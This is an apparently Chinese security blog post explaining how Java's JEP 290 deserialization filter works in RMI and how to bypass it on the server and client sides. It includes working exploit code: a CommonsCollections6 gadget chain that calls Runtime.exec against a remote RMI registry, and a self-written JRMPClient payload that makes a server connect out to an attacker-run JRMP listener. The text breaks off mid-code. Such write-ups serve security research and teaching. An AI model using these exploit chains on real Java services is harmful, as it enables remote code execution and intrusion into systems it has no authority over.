<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言如何去 Bypass JEP 290？本文会记录不同场景下的测试与绕过思路。文章包含对 JEP 290 机制的分析、针对 Server 与 Client 两端的实战演示、关键代码片段与 PoC，以及为验证所做的工具与说明（代码已发布在 GitHub 上）。 What is JEP 290？JEP 290（Java Enhancement Proposal 290）是 Java 为了解决反序列化">
<meta property="og:type" content="article">
<meta property="og:title" content="Bypass JEP 290">
<meta property="og:url" content="http://example.com/2025/11/26/Bypass-JEP-290/index.html">
<meta property="og:site_name" content="Oystr&#39;s Blog">
<meta property="og:description" content="前言如何去 Bypass JEP 290？本文会记录不同场景下的测试与绕过思路。文章包含对 JEP 290 机制的分析、针对 Server 与 Client 两端的实战演示、关键代码片段与 PoC，以及为验证所做的工具与说明（代码已发布在 GitHub 上）。 What is JEP 290？JEP 290（Java Enhancement Proposal 290）是 Java 为了解决反序列化">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405340.png">
<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405938.png">
<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405942.png">
<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405993.png">
<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405947.png">
<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405950.png">
<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405958.png">
<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405961.png">
<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405964.png">
<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405969.png">
<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764557236.png">
<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405972.png">
<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764557309.png">
<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405978.png">
<meta property="article:published_time" content="2025-11-26T13:26:34.000Z">
<meta property="article:modified_time" content="2025-12-01T02:48:31.964Z">
<meta property="article:author" content="Oyst3r">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405340.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Bypass JEP 290</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 8.1.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/11/26/Bypass-JEP-290/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/11/26/Bypass-JEP-290/&text=Bypass JEP 290"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/11/26/Bypass-JEP-290/&title=Bypass JEP 290"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/11/26/Bypass-JEP-290/&is_video=false&description=Bypass JEP 290"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Bypass JEP 290&body=Check out this article: http://example.com/2025/11/26/Bypass-JEP-290/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/11/26/Bypass-JEP-290/&title=Bypass JEP 290"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/11/26/Bypass-JEP-290/&title=Bypass JEP 290"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/11/26/Bypass-JEP-290/&title=Bypass JEP 290"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/11/26/Bypass-JEP-290/&title=Bypass JEP 290"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/11/26/Bypass-JEP-290/&name=Bypass JEP 290&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/11/26/Bypass-JEP-290/&t=Bypass JEP 290"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-JEP-290%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">What is JEP 290？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JEP-290-%E7%9A%84%E5%81%9A%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">JEP 290 的做法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E4%BA%8E-Server-%E7%AB%AF%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">针对于 Server 端的攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E4%BA%8E-Client-%E7%AB%AF%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">针对于 Client 端的攻击</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Bypass JEP 290
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Oyst3r</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-11-26T13:26:34.000Z" class="dt-published" itemprop="datePublished">2025-11-26</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Java-Security/">Java Security</a>
    </div>


      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如何去 Bypass JEP 290？本文会记录不同场景下的测试与绕过思路。文章包含对 JEP 290 机制的分析、针对 Server 与 Client 两端的实战演示、关键代码片段与 PoC，以及为验证所做的工具与说明（代码已发布在 GitHub 上）。</p>
<h2 id="What-is-JEP-290？"><a href="#What-is-JEP-290？" class="headerlink" title="What is JEP 290？"></a>What is JEP 290？</h2><p>JEP 290（Java Enhancement Proposal 290）是 Java 为了解决反序列化漏洞带来的安全问题而引入的机制。它在 JDK 8u121、JDK 7u131、JDK 6u141、Java 9 中默认启用，目的是限制在反序列化过程中可以加载的类，防止攻击者通过精心构造的对象链执行恶意代码。</p>
<p>翻看它的官方说明–&gt;<a target="_blank" rel="noopener" href="https://openjdk.org/jeps/290">JEP 290: Filter Incoming Serialization Data</a>，它的实现可以概括为三件事：</p>
<ol>
<li>限制服务端和注册中心必须在同一 host：在之前的文章中曾提及过，服务端与注册中心的相互攻击和客户端和与注册中心的相互攻击没什么两样的，而 JEP 290 强制服务端与注册中心运行于同一主机，这下从根本原因上阻断了 Server 端与 Register 端的相互攻击。</li>
<li>引入类级别的反序列化过滤机制：提供 ObjectInputFilter 接口用于细粒度控制反序列化行为。过滤器可以通过编程方式设置，也可以通过 JVM 参数（如 -Djdk.serialFilter）或 security.properties 文件进行全局配置。</li>
<li>启用更安全的默认值：从 Java 8u121&#x2F;JDK 7u131&#x2F;JDK 6u141&#x2F;Java 9 开始，即便开发者没有显式配置过滤器，JDK 开始也默认采用白名单机制对反序列化数据进行限制。</li>
</ol>
<p>主要是因为第三点的这个默认白名单，导致当时 Ysoserial 中的所有 Gadget 全部失效！而大家常提及到的 Bypass JEP 290 实际也就是对白名单的绕过！</p>
<h2 id="JEP-290-的做法"><a href="#JEP-290-的做法" class="headerlink" title="JEP 290 的做法"></a>JEP 290 的做法</h2><p>这一小节，想说清楚两个问题。一是 JEP 290 的白名单是加在了哪里？二是这个机制在哪个阶段进行了过滤？针对第一个问题，就不班门弄斧了，它是加在了如下的两个位置–&gt;</p>
<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405340.png" alt="Bypass JEP 290-01"></p>
<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405938.png" alt="Bypass JEP 290-02"></p>
<p>分别在 RegistryImpl 类和 DGCImpl 类中加入了过滤机制，仔细读读代码，其实都用的是白名单的机制，即只允许反序列化特定的类。</p>
<p>OK，那这个过滤机制是否影响 RMI 通信过程中的每一个阶段呢？显然不是的，那它这个机制在哪个阶段进行了过滤呢？先分别看一下 registryFilter、checkInput 方法的调用情况，如下–&gt;</p>
<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405942.png" alt="Bypass JEP 290-03"></p>
<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405993.png" alt="Bypass JEP 290-04"></p>
<p>都是在初始化的时候去设置了一个反序列化过滤器，再无别的地方单独调用这两个过滤代码。何为初始化，Register 的初始化就是指着<code>Registry registry = LocateRegistry.createRegistry(1099);</code>这一行代码；而 DGC 的初始化，也就是 DGCImpl_Skel 是如何创建的，之前的文章也提及过，创建时间是在<code>HelloRemoteObject helloRemoteObject = new HelloRemoteObject();</code>这行代码之前，创建方式和 RegistryImpl_Skel 类似，不赘述了。这里就简单跟一下 Register 的初始化–&gt;</p>
<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405947.png" alt="Bypass JEP 290-05"></p>
<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405950.png" alt="Bypass JEP 290-06"></p>
<p>DGC 的初始化也是同理的，那么从代码层面来看，不难发现，JEP 290 的这两个过滤代码，只影响被攻击侧是 Registry 以及 Server（仅是 DGC 侧）的情况，那么它没有防护的地方就是针对于 Server 端以及 Client 端的攻击，自然而然绕过方式也是从这两点去延伸，其实这两个东西之前就记录过，一个是“RMI 反序列化 Attack”一文中提到的客户端攻击服务端的扩展方式，而另一个点更像是在问如何让一个 Server 端马马虎虎变成一个 Client 端？这就是上篇文章“记录 RMI 引出的 Gadgets”中的东西。</p>
<h2 id="针对于-Server-端的攻击"><a href="#针对于-Server-端的攻击" class="headerlink" title="针对于 Server 端的攻击"></a>针对于 Server 端的攻击</h2><p>将 JDK 版本换到 8u121，还是老样子，先去测试参数类型为 Object 的，这次用 CC6 去攻击–&gt;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientAttackServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> HashMap <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(clazz),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;ping 6y7d5.cxsys.spacetab.top&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.lazyMap(map, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        HashMap&lt;TiedMapEntry,Integer&gt; entryMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;TiedMapEntry,Integer&gt;();</span><br><span class="line">        Class&lt;?&gt; clazzTiedMapEntry = tiedMapEntry.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazzTiedMapEntry.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(tiedMapEntry,<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        entryMap.put(tiedMapEntry, <span class="number">1</span>);</span><br><span class="line">        field.set(tiedMapEntry,lazyMap);</span><br><span class="line">        <span class="keyword">return</span> entryMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;172.23.254.68&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">IRemoteObject</span> <span class="variable">helloRemoteObject</span> <span class="operator">=</span> (IRemoteObject)registry.lookup(<span class="string">&quot;helloRemoteObject&quot;</span>);</span><br><span class="line">        System.out.println(helloRemoteObject.sayHello(getPayload()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功触发 DNS 请求，如下–&gt;</p>
<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405958.png" alt="Bypass JEP 290-07"></p>
<p>嗯嗯没错，服务端这里是没有做任何防护的。至于怎么去扩大攻击面，之前文章中也提及过，去 Hook Client 端计算 hash 值的方法即可，上次是采用手动 debug 的方式，这次尝试用 RASP 去实现，看网上都是清一色的去 Hook java.rmi.server.RemoteObjectInvocationHandler 类 InvokeRemoteMethod 方法的 args 参数，也就是下面这里–&gt;</p>
<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405961.png" alt="Bypass JEP 290-08"></p>
<p>这里不选择去 Hook 这个点，而是去 Hook<code>ref.invoke((Remote) proxy, method, args, getMethodHash(method));</code>这行代码的第四个参数，也就是不用去手动改 getMethodHash(method) 的返回值了，直接定成一个常量即可，值即为之前提到过的 8370655165776887524L，截三张其中比较关键的图片–&gt;</p>
<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405964.png" alt="Bypass JEP 290-09"></p>
<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405969.png" alt="Bypass JEP 290-10"></p>
<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764557236.png" alt="Bypass JEP 290-11"></p>
<p>成功触发 DNS 请求，如下–&gt;</p>
<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/11/29/1764405972.png" alt="Bypass JEP 290-12"></p>
<p>具体的操作过程、代码放到 Github 上了：<a target="_blank" rel="noopener" href="https://github.com/Oyst3r1ng/JEP290-Bypasser">JEP290-Bypasser</a></p>
<p><font color="#76923c">Tips：这里也尝试直接去将 method Hook 为 IRemoteObject.class.getDeclaredMethod(“sayHello”, String.class)，应该是类加载先后顺序的原因，JVM 始终找不到这个 IRemoteObject 类，暂时没能成功。</font></p>
<h2 id="针对于-Client-端的攻击"><a href="#针对于-Client-端的攻击" class="headerlink" title="针对于 Client 端的攻击"></a>针对于 Client 端的攻击</h2><p>这一点就是“记录 RMI 引出的 Gadgets”一文中的第二条链，通过一个反序列化的点让 Server 端向外发起一次 JRMP 请求，与 Ysoserial 中 ysoserial.exploit.JRMPListener 配合完成一次反序列化的攻击。</p>
<p>演示一下，老样子还是开启一个普通的 RMIServer–&gt;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HelloRemoteObject</span> <span class="variable">helloRemoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloRemoteObject</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;helloRemoteObject&quot;</span>, helloRemoteObject);</span><br><span class="line">        System.out.println(<span class="string">&quot;RMI Server is ready...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就不使用 Ysoserial 中的 ysoserial.payloads.JRMPClient 这个 gadget 了，它只可以生成一段恶意的序列化数据，没魔改过的 Ysoserial 不太方便用这个 payload 直接去打 RMIServer，所以自实现一个 payloads.JRMPClient 如下（就是将之前 ClientAttackRegistry 的代码改了改）–&gt;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.registry.RegistryImpl_Stub;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClientPayload</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;xxx.xxx.xxx.xxx&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Operation[] operations = <span class="keyword">new</span> <span class="title class_">Operation</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.lang.String list()[]&quot;</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void unbind(java.lang.String)&quot;</span>)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">(RegistryImpl_Stub registry)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.rmi.server.RemoteObject&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) field.get(registry);</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall(registry, 